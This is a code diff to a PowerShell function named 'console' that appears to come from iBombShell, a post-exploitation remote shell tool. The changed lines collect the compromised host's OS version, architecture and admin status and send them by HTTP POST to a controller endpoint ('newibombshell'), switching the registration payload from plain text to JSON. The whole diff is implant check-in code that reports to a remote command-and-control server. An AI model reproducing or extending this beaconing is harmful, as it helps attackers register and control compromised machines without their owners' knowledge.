@@ -1,5 +1,3 @@
-
-
 function console{
  
     param(
@@ -127,9 +125,14 @@ function console{
             {
                 try 
                 {
-                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id"
-                    $data = "custominfo`n" + $id + "`n" + $admin + "`n" + $os_version + $os_arch
-                    $req = iwr -UseBasicParsing -Method POST -Uri "$uriConsole/data-ibombshell/$id" -Body @{results=$data}
+                    $data = @{
+                        os_version=$os_version
+                        os_arch=$os_arch
+                        admin=$admin
+                    }
+
+                    $info = $data | ConvertTo-Json
+                    $req = iwr -UseBasicParsing -Method POST -Uri "$uriConsole/newibombshell/$id" -Body @{results=$info}
                     break
                 }
                 catch 
@@ -290,5 +293,3 @@ function console{
     }
 
 }
-
-
